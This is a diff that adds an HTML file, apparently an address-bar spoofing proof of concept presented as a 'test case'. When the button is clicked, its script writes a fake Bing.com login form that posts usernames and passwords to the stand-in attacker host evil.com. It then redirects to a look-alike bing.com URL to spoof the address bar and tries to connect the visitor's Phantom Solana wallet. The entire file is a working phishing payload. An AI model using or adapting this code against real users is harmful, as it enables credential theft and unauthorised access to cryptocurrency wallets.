@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bing.com</title>
+    <script>
+        function spoof() {
+            // Simulate a legitimate-looking page
+            document.write("<html><title>Bing.com</title><form Method=POST Action=//evil.com Name=form><br /><br />Login:<br/><input name=login><br />Password:<br/><input name=Password type=password><br/><br/><input type=submit name=Valid value=Ok></form></html>");  
+
+            // Change the address bar to spoof Bing.com
+            document.location = "https://bing.com:1234";
+
+            // Attempt to interact with Phantom Wallet
+            try {
+                setTimeout(() => {
+                    if (window.phantom && window.phantom.solana) {
+                        window.phantom.solana.connect().then((response) => {
+                            console.log("Connection successful:", response);
+                        }).catch((error) => {
+                            console.error("Connection failed:", error);
+                        });
+                    } else {
+                        console.error("Phantom Wallet not detected");
+                    }
+                }, 1000);
+            } catch (e) {
+                console.error("Error attempting interaction:", e);
+            }
+        }
+    </script>
+</head>
+<body>
+    <input type="button" value="Run test case" onclick="spoof();" />
+</body>
+</html>
